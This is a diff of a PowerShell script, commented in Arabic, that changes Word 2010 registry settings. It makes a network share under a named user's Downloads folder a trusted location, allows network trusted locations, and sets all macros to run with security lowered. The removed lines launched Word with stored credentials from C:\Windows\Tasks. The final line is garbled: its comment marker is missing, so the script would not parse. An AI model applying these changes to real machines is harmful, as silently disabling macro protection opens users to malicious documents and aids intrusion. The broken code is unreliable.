@@ -27,18 +27,17 @@ if (Test-Path $File) {
 
 
 # تعيين المجلد كموقع موثوق في Word 2010 (Office 14)
-$TrustedPath = "HKCU:\Software\Microsoft\Office\14.0\Word\Security\Trusted Locations\Location1"
-New-Item -Path $TrustedPath -Force
-Set-ItemProperty -Path $TrustedPath -Name "Path" -Value "C:\Users\Public\Documents\"
+$TrustedPath = "HKCU:\Software\Microsoft\Office\14.0\Word\Security\Trusted Locations\ShareLocation"
+$NetworkPath = "\\FILE01\Users\emily.davi\Downloads"
+
+New-Item -Path $TrustedPath -Force -ErrorAction SilentlyContinue
+Set-ItemProperty -Path $TrustedPath -Name "Path" -Value $NetworkPath
 Set-ItemProperty -Path $TrustedPath -Name "AllowSubFolders" -Value 1
 
-Start-Process -FilePath "C:\Program Files\Microsoft Office\Office14\WINWORD.EXE" `
-              -ArgumentList "C:\Users\Public\Documents\test.docx" `
-              -Credential $Credential `
-              -WorkingDirectory "C:\Windows\Tasks"
+# 2. السماح بالمواقع الشبكية
+$SecurityPath = "HKCU:\Software\Microsoft\Office\14.0\Word\Security"
+Set-ItemProperty -Path $SecurityPath -Name "AllowNetworkLocations" -Value 1
 
-
-              # تعطيل حماية الماكرو مؤقتاً للمستخدم الحالي
-$RegPath = "HKCU:\Software\Microsoft\Office\14.0\Word\Security"
-Set-ItemProperty -Path $RegPath -Name "VBAWarnings" -Value 1  # 1 = تمكين جميع الماكرو
-Set-ItemProperty -Path $RegPath -Name "Level" -Value 1       # 1 = منخفض (تمكين الكل)
+# 3. تمكين الماكرو (تخفيض الأمان)
+Set-ItemProperty -Path $SecurityPath -Name "VBAWarnings" -Value 1
+Set-ItemProperty -Path $SecurityPath -Name "Level" -Value 1منخفض (تمكين الكل)
